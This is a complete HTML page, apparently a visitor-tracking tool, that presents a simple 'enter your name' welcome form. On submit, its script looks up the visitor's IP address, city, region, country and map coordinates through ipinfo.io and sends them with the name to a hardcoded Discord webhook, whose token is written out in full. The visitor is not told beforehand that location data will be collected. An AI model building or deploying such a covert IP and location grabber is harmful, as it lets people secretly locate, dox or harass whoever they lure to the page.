<!DOCTYPE html>
<html>
<head>
  <title>Visitor Info Logger with Coordinates</title>
</head>
<body>
  <h2>Welcome!</h2>
  <p>Please enter your name:</p>
  <input type="text" id="nameInput" placeholder="Your name" />
  <button id="submitBtn">Submit</button>

  <p id="status"></p>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1389939874454442044/xzwnU8-Y6OmJzrBIPkApuOjRPEq1uURdEQcWcJS-tTlxRpxRJTEq4VlxmSP-XI0aYRFW"; // Replace with your Discord webhook

    document.getElementById("submitBtn").addEventListener("click", () => {
      const name = document.getElementById("nameInput").value.trim();
      if (!name) {
        alert("Please enter your name!");
        return;
      }

      document.getElementById("status").textContent = "Fetching your IP info...";

      fetch("https://ipinfo.io/json")
        .then(res => res.json())
        .then(ipData => {
          // ipData.loc is a string like "latitude,longitude"
          const coords = ipData.loc ? ipData.loc.split(",") : ["Unknown", "Unknown"];
          const latitude = coords[0];
          const longitude = coords[1];

          const message = {
            content: `ðŸ‘¤ Visitor Name: **${name}**\n` +
                     `ðŸŒ IP: ${ipData.ip}\n` +
                     `ðŸ™ï¸ City: ${ipData.city}\n` +
                     `ðŸŒ Region: ${ipData.region}\n` +
                     `ðŸ‡ºðŸ‡¸ Country: ${ipData.country}\n` +
                     `ðŸ“ Coordinates: Latitude ${latitude}, Longitude ${longitude}`
          };

          fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(message)
          }).then(() => {
            document.getElementById("status").textContent = "Thank you! Your info was sent.";
          }).catch(err => {
            document.getElementById("status").textContent = "Error sending info.";
            console.error("Discord webhook error:", err);
          });
        })
        .catch(err => {
          document.getElementById("status").textContent = "Error fetching IP info.";
          console.error("IP info error:", err);
        });
    });
  </script>
</body>
</html>
